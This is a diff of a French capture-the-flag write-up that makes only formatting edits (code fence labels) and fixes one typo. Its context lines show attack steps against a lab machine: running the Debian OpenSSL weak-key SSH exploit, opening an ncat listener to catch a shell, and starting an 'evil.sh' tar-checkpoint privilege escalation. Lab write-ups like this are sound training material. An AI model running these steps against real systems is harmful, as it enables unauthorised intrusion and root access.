@@ -50,7 +50,7 @@ Un scan de port UDP (généralement inintéressant sur les CTF) et une tentative
 
 Au vu de la version du *OpenSSH* et de la date de publication du CTF on peut tenter [un exploit](https://www.exploit-db.com/exploits/5720/) pour la faille introduite par Debian :  
 
-```bash
+```console
 $ python2 exploit.py rsa/2048 192.168.1.43 root 22 5
 
 -OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
@@ -178,7 +178,7 @@ print(response.text)
 
 et le miracle s'accomplit dans un ncat préalablement lancé :  
 
-```bash
+```console
 $ sudo ncat -l -p 21 -v
 Ncat: Version 7.01 ( https://nmap.org/ncat )
 Ncat: Listening on :::21
@@ -246,7 +246,7 @@ Il y a un utilisateur *rene* (par rapport à [Magritte](https://fr.wikipedia.org
 
 Cet utilisateur a un dossier personnel que l'on peut visiter et plus encore :  
 
-```bash
+```console
 $ ls -alR /home/rene
 /home/rene:
 total 24
@@ -330,7 +330,7 @@ Je vois bien une option dans la page de man de tar mais elle n'est utilisée que
 
 J'ai fini par trouver [une astuce](https://www.soliantconsulting.com/blog/dangers-wildcards-bash) qui utilise les checkpoints.  
 
-D'abord je créé un script *evil.sh* dans */home/rene/backup* :  
+D'abord je crée un script *evil.sh* dans */home/rene/backup* :  
 
 ```bash
 #!/bin/bash
